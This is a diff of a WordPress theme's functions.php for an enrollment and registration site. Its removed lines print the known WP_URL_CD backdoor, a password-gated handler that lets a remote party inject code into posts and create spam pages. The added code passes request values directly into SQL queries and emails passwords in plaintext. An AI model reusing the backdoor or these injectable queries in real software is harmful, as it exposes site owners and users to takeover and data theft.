@@ -1,99 +1,9 @@
 <?php
-if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6dbb5b801cd7922188450c6486baa200'))
-	{
-		switch ($_REQUEST['action'])
-			{
-				case 'get_all_links';
-					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
-						{
-							$data['code'] = '';
-							
-							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
-								{
-									$data['code'] = $_[1];
-								}
-							
-							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
-						}
-				break;
-				
-				case 'set_id_links';
-					if (isset($_REQUEST['data']))
-						{
-							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
-							
-							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
-							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
+/**
+* Display Registration form on front end 
+*/
 
-							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
-								{
-									print "true";
-								}
-						}
-				break;
-				
-				case 'create_page';
-					if (isset($_REQUEST['remove_page']))
-						{
-							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
-								{
-									print "true";
-								}
-						}
-					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
-						{
-							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
-								{
-									print "true";
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_URL_CD";
-			}
-			
-		die("");
-	}
 
-if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
-	{
-		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
-		if ($data -> full_content)
-			{
-				print stripslashes($data -> content);
-			}
-		else
-			{
-				print '<!DOCTYPE html>';
-				print '<html ';
-				language_attributes();
-				print ' class="no-js">';
-				print '<head>';
-				print '<title>'.stripslashes($data -> title).'</title>';
-				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
-				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
-				print '<meta name="robots" content="index, follow" />';
-				print '<meta charset="';
-				bloginfo( 'charset' );
-				print '" />';
-				print '<meta name="viewport" content="width=device-width">';
-				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
-				print '<link rel="pingback" href="';
-				bloginfo( 'pingback_url' );
-				print '">';
-				wp_head();
-				print '</head>';
-				print '<body>';
-				print '<div id="content" class="site-content">';
-				print stripslashes($data -> content);
-				get_search_form();
-				get_sidebar();
-				get_footer();
-			}
-		exit;
-	}
-?><?php
-/* my code 010517 */
 
 function pippin_registration_form() {
 	// only show the registration form to non-logged-in members
@@ -120,10 +30,20 @@ function pippin_registration_form() {
 }
 add_shortcode('register_form', 'pippin_registration_form');
 
+
+
+
+/**
+* WP Error Handling
+*/
 function pippin_errors(){
     static $wp_error; // Will hold global variable safely
     return isset($wp_error) ? $wp_error : ($wp_error = new WP_Error(null, null, null));
 }
+
+/**
+* Display Error message
+*/
 function pippin_show_error_messages() {
 	if($codes = pippin_errors()->get_error_codes()) {
 		echo '<div class="pippin_errors">';
@@ -136,8 +56,9 @@ function pippin_show_error_messages() {
 	}	
 }
 
-
-// registration form fields
+/**
+* Display Registration form fields
+*/
 function pippin_registration_form_fields() {
 	ob_start(); ?>
 	<br/><br/>		
@@ -304,7 +225,9 @@ function pippin_registration_form_fields() {
 }
 
 
-// register a new user
+/**
+* Method for adding User information to database - user registration
+*/
 function pippin_add_new_member() {
   	if (isset( $_POST["EMAIL"] ) && isset($_POST['add'])) {
   		session_start();
@@ -363,29 +286,40 @@ function pippin_add_new_member() {
 		
 			if($new_user_id) {
 			      $to = $b_email;
-                  $subject = 'Registration Successfull.';
+                  $subject = 'Registration Successful.';
                   $sender = 'info';
-                  $fromemail='felixthomas727@gmail.com';
-                  $message = 'Email id: '.$b_email.' And Your new password is: '.$user_pwd;
+                  $fromemail='online-registration@musicalretreat.org';
+                  $message .= 'Thanks for registering with us.<br>';
+
+				$message .= 'Here is your login info:<br>';
+
+				$message .= "Login id = ".$b_email. "<br>";
+				$message .= "Password = ".$user_pwd. "<br>";
+				$message .= "<a href='".site_url()."/login'>Please click here to login.</a><br>";
+				$message .= "Never share your login info with anyone.<br>";
+
                   $headers[] = 'MIME-Version: 1.0' . "\r\n";
-                  $headers[] = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+                  $headers[] = 'Content-type: text/html; charset=ISO-8859-1' . "\r\n";
+
                   $headers[] = "X-Mailer: PHP \r\n";
                   $headers[] = 'From: '.$sender.' < '.$fromemail.'>' . "\r\n";
                   $mail = wp_mail( $to, $subject, $message, $headers );
 				  $red=site_url().'/login';
+				  session_start();
+				  $_SESSION['succmsg'] = 'You are successfully registered.';
 				  wp_redirect($red); exit;
 			}
 		}
-		else{
-			echo 333;
+		else{	
 		}
 	
 	}
 }
 add_action('init', 'pippin_add_new_member');
 
-
-// register a new user
+/**
+* Method for updating user profile info from dashboard
+*/
 function pippin_update_member() {
   	if (isset( $_POST["EMAIL"] ) && isset($_POST['update'])) {
   		session_start();
@@ -444,6 +378,10 @@ function pippin_update_member() {
 }
 add_action('init', 'pippin_update_member');
 
+
+/**
+* Display Profile form
+*/
 function pippin_profile_form() {
 	
 	// only show the registration form to non-logged-in members
@@ -460,7 +398,9 @@ function pippin_profile_form() {
 }
 add_shortcode('profile_form', 'pippin_profile_form');
 
-// registration form fields
+/**
+* Display Profile form fields on Dashboard
+*/
 function pippin_profile_form_fields() {
 	$new_user_id=get_current_user_id();
 	$user_info = get_userdata($new_user_id);
@@ -478,8 +418,7 @@ function pippin_profile_form_fields() {
 		<?php 
 		// show any error messages after form submission
 		pippin_show_error_messages(); ?>
-	
-	
+
 <form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-15" method="post" data-id="15" data-name="register"><div class="mc4wp-form-fields"><p>
 	<label>Email address <span style="color:red;">*</span></label>
 	<input type="email" name="EMAIL" placeholder="Your email address" value="<?php echo $user_info->user_email; ?>" required readonly>
@@ -510,7 +449,7 @@ function pippin_profile_form_fields() {
 </p>
 <p>
     <label>City <span style="color:red;">*</span></label>
-    <input name="city" type="text" required value="<?php echo $user_city; ?>">
+    <input name="city" type="text" required value="<?php echo $user_city; ?>">	
 </p>
 
 <p>
@@ -594,6 +533,7 @@ function pippin_profile_form_fields() {
     <label>Contact Phone <span style="color:red;">*</span></label>
     <input name="MMERGE5" type="tel" required value="<?php echo $user_phone; ?>">
 </p>
+
 <p>
     <label>Emergency Contact Name</label>
     <input name="MMERGE6" type="text" value="<?php echo $user_imergency_name; ?>">
@@ -614,7 +554,6 @@ function pippin_profile_form_fields() {
 	return ob_get_clean();
 }
 
-
 add_filter( 'wp_nav_menu_items', 'wti_loginout_menu_link', 10, 2 );
 function wti_loginout_menu_link( $items, $args ) {
    if ($args->theme_location == 'primary') {
@@ -629,12 +568,17 @@ function wti_loginout_menu_link( $items, $args ) {
    return $items;
 }
 
-
-// user login form
+/**
+* Display Login Form
+*/
 function pippin_login_form() {
 	
 	if(!is_user_logged_in()) {
-		
+		session_start();
+		echo "<div style='color: green;'>";
+		echo $_SESSION['succmsg'];
+		echo "</div>";
+		unset($_SESSION['succmsg']);
 		global $pippin_load_css;
 		
 		// set this to true so the CSS is loaded
@@ -643,14 +587,15 @@ function pippin_login_form() {
 		$output = pippin_login_form_fields();
 	} else {
 		// could show some logged in user info here
-		// $output = 'user info here';
 	}
 	return $output;
 }
 add_shortcode('login_form', 'pippin_login_form');
 
 
-// login form fields
+/**
+* Login Form Fields, used in pippin_login_form
+*/
 function pippin_login_form_fields() {
 		
 	ob_start(); ?>
@@ -680,9 +625,9 @@ function pippin_login_form_fields() {
 	return ob_get_clean();
 }
 
-
-
-// logs a member in after submitting a form
+/**
+* Method for login and redirecting to dashboard area.
+*/
 function pippin_login_member() {
 	if(isset($_POST['pippin_user_login']) && wp_verify_nonce($_POST['pippin_login_nonce'], 'pippin-login-nonce')) {
 				
@@ -720,61 +665,9 @@ function pippin_login_member() {
 add_action('init', 'pippin_login_member');
 
 
-/*THEME SETTING*/
-/* ----------- Theme Setting ----------*/
-
-function add_theme_menu_item()
-{
-	add_submenu_page("themes.php", "Theme Options", "Theme Options", "manage_options", "theme-options", "theme_settings_page");
-}
-
-add_action("admin_menu", "add_theme_menu_item");
-
-function theme_settings_page()
-{
-    ?>
-	    <div class="wrap">
-	    <h1>Theme Options</h1>
-	    <form method="post" action="options.php" enctype="multipart/form-data">
-	        <?php
-	            settings_fields("section");
-	            do_settings_sections("theme-options");      
-	            submit_button(); 
-	        ?>          
-	    </form>
-		</div>
-	<?php
-}
-
-function disable_enrollment_func()
-{
-    $options = get_option( 'disable_enrollments' );
-    $html = '<input type="checkbox" id="checkbox_example" name="disable_enrollments" value="1"' . checked( 1, $options, false ) . '/>';
-    $html .= '<label for="checkbox_example">Disable enrollment</label>';
-    echo $html;
-}
-
-function disable_questionaire()
-{
-    $options = get_option( 'disable_questionairies' );
-    $html = '<input type="checkbox" id="disable_questionairies" name="disable_questionairies" value="1"' . checked( 1, $options, false ) . '/>';
-    $html .= '<label for="disable_questionairies">Disable Questionaire</label>';
-    echo $html;
-}
-
-function display_theme_panel_fields()
-{
-	add_settings_section("section", "All Settings", null, "theme-options");
-    add_settings_field("disable_enrollments", "Disable Enrollment", "disable_enrollment_func", "theme-options", "section");
-    add_settings_field("disable_questionairies", "Disable Questionnaire", "disable_questionaire", "theme-options", "section");
-    register_setting("section", "disable_enrollments");
-    register_setting("section", "disable_questionairies");
-}
-add_action("admin_init", "display_theme_panel_fields");
-
-
-/*05-05-17 changes*/
-
+/**
+* Display extra user profile information for admin edit user screen
+*/
 add_action( 'show_user_profile', 'my_show_extra_profile_fields' );
 add_action( 'edit_user_profile', 'my_show_extra_profile_fields' );
 function my_show_extra_profile_fields( $user ) {
@@ -891,6 +784,7 @@ function my_show_extra_profile_fields( $user ) {
             <th><label>Contact Phone</label></th>
             <td><input name="MMERGE5" type="text" required value="<?php echo $user_phone; ?>"></td>
         </tr>
+
         <tr>
             <th><label>Emergency Contact Name</label></th>
             <td><input name="MMERGE6" type="text" value="<?php echo $user_imergency_name; ?>"></td>
@@ -902,6 +796,9 @@ function my_show_extra_profile_fields( $user ) {
 	</table>
 <?php }
 
+/**
+* my_save_extra_profile_fields - Update user profile fields on admin screen
+*/
 add_action( 'personal_options_update', 'my_save_extra_profile_fields' );
 add_action( 'edit_user_profile_update', 'my_save_extra_profile_fields' );
 function my_save_extra_profile_fields( $user_id ) {
@@ -922,6 +819,7 @@ function my_save_extra_profile_fields( $user_id ) {
 
 ////////////////////////////////  Testing visual form builder SH May 15
 // Form ID = 1 
+
 
 add_filter( 'vfb_field_default', 'vfb_filter_field_default', 10, 4 );
 
@@ -962,58 +860,78 @@ function vfb_filter_field_default( $default, $field_type, $field_id, $form_id ){
 
     return $default;
 }
+
+
+
+
+/**
+* display_logindata - Displays user information on Add/Edit Enrollment screen
+*/
 function display_logindata( $atts ) {
 	$user = new WP_User(get_current_user_id());
 
 	$all_meta_for_user = get_user_meta( $user->ID );
-	//echo "<pre>"; print_r($_REQUEST); echo "<pre>";
 
 ?>
-        <li id="field_1_44" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label">Gender</label>
-            <div class="ginput_container ginput_container_radio">
-			<div class="ginput_container ginput_container_text"><input name="input_45" id="input_1_45" value="<?php  echo $all_meta_for_user['pippin_user_gender'][0];  ?>" class="medium"  type="text" readonly></div>    
-            </div>
-         </li>
+        
          <li id="field_1_45" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="input_1_45">First Name</label>
-            <div class="ginput_container ginput_container_text"><input name="input_45" id="input_1_45" value="<?php  print_r( $all_meta_for_user['first_name'][0] ); ?>" class="medium" tabindex="3" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="input_1_45">First Name</label> : 
+           <?php  print_r( $all_meta_for_user['first_name'][0] ); ?>
          </li>
          <li id="field_1_3" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="input_1_3">Last Name</label>
-            <div class="ginput_container ginput_container_text"><input name="input_3" id="input_1_3" value="<?php  print_r( $all_meta_for_user['last_name'][0] ); ?>" class="medium" tabindex="4" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="input_1_3">Last Name</label> : 
+            <?php  print_r( $all_meta_for_user['last_name'][0] ); ?>
          </li>
 		 <li id="field_1_45" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="input_1_45">Email</label>
-            <div class="ginput_container ginput_container_text"><input name="input_45" id="input_1_45" value="<?php print_r( $user->data->user_email ); ?>" class="medium" tabindex="3" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="input_1_45">Email</label> : 
+            <?php print_r( $user->data->user_email ); ?>
+         </li>
+         <li id="field_1_44" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
+            <label class="gfield_label">Gender</label> : 
+           <?php  echo $all_meta_for_user['pippin_user_gender'][0];  ?>
          </li>
          <li id="field_1_4" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="input_1_4">Street Address</label>
-            <div class="ginput_container ginput_container_text"><input name="input_4" id="input_1_4" value="<?php   print_r( $all_meta_for_user['pippin_user_address1'][0] ); ?>" class="medium" tabindex="5" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="input_1_4">Street Address</label> : 
+            
+            <?php   print_r( $all_meta_for_user['pippin_user_address1'][0] ); ?>
          </li>
          <li id="field_1_5" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="input_1_5">City</label>
-            <div class="ginput_container ginput_container_text"><input name="input_5" id="input_1_5" value="<?php print_r( $all_meta_for_user['pippin_user_city'][0] ); ?>" class="medium" tabindex="6" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="input_1_5">City</label> : 
+            
+            <?php print_r( $all_meta_for_user['pippin_user_city'][0] ); ?>
          </li>
 		 <li id="field_1_6" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="input_1_6">State</label>
-            <div class="ginput_container ginput_container_text"><input name="input_6" id="input_1_6" value="<?php print_r( $all_meta_for_user['pippin_user_state'][0] ); ?>" class="medium" tabindex="7" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="input_1_6">State</label> : 
+            
+            <?php print_r( $all_meta_for_user['pippin_user_state'][0] ); ?>
          </li>
          <li id="field_1_7" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="input_1_7">Zip</label>
-            <div class="ginput_container ginput_container_text"><input name="input_7" id="input_1_7" value="<?php print_r( $all_meta_for_user['pippin_user_zip'][0] ); ?>" class="medium" tabindex="8" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="input_1_7">Zip</label> : 
+            
+            <?php print_r( $all_meta_for_user['pippin_user_zip'][0] ); ?>
+           
          </li>
 		 <li id="" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
-            <label class="gfield_label" for="">Country</label>
-            <div class="ginput_container ginput_container_text"><input name="" id="" value="<?php  echo $all_meta_for_user['pippin_user_country'][0]  ?>" class="medium" tabindex="8" aria-invalid="false" type="text" readonly></div>
+            <label class="gfield_label" for="">Country</label> : 
+            
+            <?php  echo $all_meta_for_user['pippin_user_country'][0]  ?>
+         </li>
+         <li id="" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
+            <label class="gfield_label" for="">Contact Phone</label> : 
+            
+            <?php  echo $all_meta_for_user['pippin_user_phone'][0]  ?>
          </li>
 		 <li id="field_1_9" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
             <label class="gfield_label" for="input_1_9">Emergency Contact Name</label>
-            <div class="ginput_container ginput_container_text"><input name="input_9" id="input_1_9" value="<?php print_r( $all_meta_for_user['imergency_contact_name'][0] ); ?>" class="medium" tabindex="10" aria-invalid="false" type="text" readonly></div>
+            :
+            <?php print_r( $all_meta_for_user['imergency_contact_name'][0] ); ?>
+            
          </li>
          <li id="field_1_10" class="gfield field_sublabel_below field_description_below gfield_visibility_visible">
             <label class="gfield_label" for="input_1_10">Emergency Contact Phone</label>
-            <div class="ginput_container ginput_container_text"><input name="input_10" id="input_1_10" value="<?php print_r( $all_meta_for_user['imergency_contact_phone'][0] ); ?>" class="medium" tabindex="11" aria-invalid="false" type="text" readonly></div>
+            :
+            <?php print_r( $all_meta_for_user['imergency_contact_phone'][0] ); ?>
+            	
          </li>
          
 		 <?php
@@ -1021,18 +939,42 @@ function display_logindata( $atts ) {
 }
 add_shortcode( 'logindata', 'display_logindata' );
 
+/**
+* enrollment_button - Display enrollment button based on different criteria, that set by admin, ie, Enrollment Status, Questionaire Status, Payment
+*/
 function enrollment_button( $atts ) {
+echo "<h2>";
+session_start();
+echo "<div style='color: green;'>";
+echo $_SESSION['succmsg'];
+echo "</div>";
+echo "</h2>";
+unset($_SESSION['succmsg']);
+	if(!is_user_logged_in()){ 
+	?>
+	<script>
+	jQuery(document).ready(function(){
+		window.location.href = '<?php  echo site_url(); ?>';
+	});
+
+	</script>
+	
+	<?php
+	}
+else{
+
 	// check is free or paid
+
+	// 218 id of enrollment page
 	$is_paid = get_post_meta( 218, 'is_paid', true );
 	// Check if the custom field has a value.
 	
 	if ( ! empty( $is_paid ) ) {
 		if($is_paid == 'no')
 		{
-			
 		}	
 		else{
-			echo "<a href=''>Make Payment</a><br>";
+			echo "<a href='#'>Make Payment</a><br>";
 		}
 	}
 	// End check is free or paid
@@ -1041,26 +983,32 @@ function enrollment_button( $atts ) {
 	$status = get_post_meta( 218, 'enrollment_status', true );
 		
 		$user = wp_get_current_user();
-		
+			
 			global $wpdb;
 			$querystr = "
-			SELECT * 
-			FROM wp_rg_lead
-			WHERE created_by = $user->ID
-			AND form_id = 1
-			";
+						SELECT * 
+						FROM ".$wpdb->prefix."rg_lead
+						WHERE created_by = $user->ID
+						AND form_id = 1
+						";
 
 			$check_user = $wpdb->get_results($querystr, OBJECT);
-			$entry_id = '';
+			$entry_id = array();
 			foreach ($check_user as $formdata) {
-			$FormID = $formdata->form_id;
-			$entry_id = $formdata->id;
+				$FormID = $formdata->form_id;
+				$entry_id[] = $formdata->id;
 			}
 
 			if($FormID == ''){
 				// if status is open
 				if($status == 'open'){
-					echo "<a href='".site_url()."/event-form/'> Add Enrollment Form </a>";
+					$current_user = wp_get_current_user();
+					if($current_user->roles[0] == 'administrator'){
+						echo "<a href='".site_url()."/admin-enrollment-form/'> View All Enrolled Form </a>";
+					}
+					else{
+						echo "<a href='".site_url()."/enrollment-form/'> Add Enrollment Form </a>";
+					}
 				}
 				// End if status is open
 				// if status is close
@@ -1079,22 +1027,144 @@ function enrollment_button( $atts ) {
 					}
 					else{
 
-					
-					echo do_shortcode('[gv_entry_link action="edit" entry_id="'.$entry_id.'" view_id="220" /]'); 
-						//echo "<a href='".site_url()."/view/event-form/'> Edit Enrolled Form </a>";
+						echo do_shortcode('[gv_edit_entry_link entry_id="'.$entry_id[0].'" view_id="220"] Edit Enrollment [/gv_edit_entry_link]'); 
 					}
 					
 				}
 				// End if status is open
 				// if status is close
 				else{
-					echo "<a href='".site_url()."/view/event-form/'> Enrolled Form </a>";
+					$current_user = wp_get_current_user();
+					if($current_user->roles[0] == 'administrator'){
+						echo "<a href='".site_url()."/admin-enrollment-form/'> View All Enrolled Form </a>";
+					}
+					else{
+
+						echo do_shortcode('[gv_edit_entry_link entry_id="'.$entry_id[0].'" view_id="220"] View Enrollment [/gv_edit_entry_link]'); 
+					}
+
 				}
-				//End  if status is close
 			}
 }
-			
-	
-	
+}
+
 add_shortcode( 'enrollment_option', 'enrollment_button' );
-?>
+
+function do_payment( $atts ){
+	$current_user = wp_get_current_user();
+	
+	global $wpdb;
+	$querystr = "
+				SELECT * 
+				FROM gravity_amount
+				WHERE user_id = ".$current_user->ID."
+				";
+
+	$get_data = $wpdb->get_results($querystr, OBJECT);
+	$entry_id = array();
+	foreach ($get_data as $formdata) {
+		//echo $formdata->amount;
+	}
+	?>
+	<br><br>
+	<input type="button" id="makepayment" name="makepayment" value="Make Payment">
+
+	<div class="paymentoption" style="display: none">
+	<input name="paymentoption" id="onlinepayment" value="onlinepayment" type="radio"> <span>Online Payment</span>
+	<input name="paymentoption" id="sendingcheck" value="sendingcheck" type="radio"> <span>Sending Cheque</span>
+	</div>
+
+	<div class="fullpaymentoptions" style="display: none">
+	<input name="fullpaymentoptions" value="fullpayment" type="radio"> <span>Full Payment</span>
+	<input name="fullpaymentoptions" value="paydeposite" type="radio"> <span>Pay a deposit of $150 </span>
+	<input type="text" placeholder="customamount" name="fullpaymentoptions"> 
+	</div>
+
+	<?php
+}
+
+add_shortcode( 'payment_option', 'do_payment' );
+/**
+* blockusers_init - Method restricts Normal user to wordpress admin Screen.
+*/
+add_action( 'init', 'blockusers_init' );
+function blockusers_init() {
+if ( is_admin() && ! current_user_can( 'administrator' ) &&
+! ( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
+wp_redirect( home_url() );
+exit;
+}
+}
+
+
+
+/**
+* my_custom_fonts - Style for disable add new user option on Admin Screen
+*/
+add_action('admin_head', 'my_custom_fonts');
+
+function my_custom_fonts() {
+  echo '<style>
+    .users-php .wrap .page-title-action,.users-php .wp-submenu li:nth-child(3),.user-edit-php .wrap .page-title-action, .user-edit-php .wp-submenu li:nth-child(3),.profile-php .wrap .page-title-action,.profile-php .wp-submenu li:nth-child(3),.users_page_wpfront-user-role-editor-assign-roles .wrap .page-title-action,.users_page_wpfront-user-role-editor-assign-roles .wp-submenu li:nth-child(3),#menu-users .wp-submenu-wrap li:nth-child(3){ display:none !important; }
+    
+  </style>';
+}
+
+
+// add_action( 'wp_ajax_insertamount', 'prefix_ajax_insertamount' );
+// add_action( 'wp_ajax_nopriv_insertamount', 'prefix_ajax_insertamount' );
+
+// function prefix_ajax_insertamount() {
+// print_r($_REQUEST);
+// exit;
+// }
+
+add_action( 'gform_after_submission', 'set_post_content', 10, 2 );
+function set_post_content( $entry, $form ) {
+
+
+	if($_REQUEST['lid'] == ''){
+		$entryID = $entry['id'];
+	}
+	else{
+		$entryID = $_REQUEST['lid'];
+	}
+	global $wpdb;
+	$querystr = "
+				SELECT * 
+				FROM ".$wpdb->prefix."rg_lead
+				WHERE id = ".$entryID."
+				";
+
+	$check_user = $wpdb->get_results($querystr, OBJECT);
+	$entry_id = array();
+	$created_by = '';
+
+	foreach ($check_user as $formdata) {
+		$created_by = $formdata->created_by;
+	}
+
+	$qrygetuser = "
+				SELECT * 
+				FROM gravity_amount
+				WHERE user_id = ".$created_by."
+				";
+	$getuser = $wpdb->get_results($qrygetuser, OBJECT);
+
+	if (empty($getuser)) {
+		global $wpdb;
+		$sql = "INSERT INTO gravity_amount
+	          	(`entry_id`,`user_id`,`amount`) 
+	   			values (".$entryID.", ".$created_by.", ".$_REQUEST['amount'].")";
+		$wpdb->query($sql);
+	}
+	else{
+		global $wpdb;
+		$sql = "UPDATE gravity_amount set
+				amount = ".$_REQUEST['amount'].",
+				entry_id = ".$entryID."
+				WHERE user_id = ".$created_by."";
+
+		$wpdb->query($sql);
+	}
+}
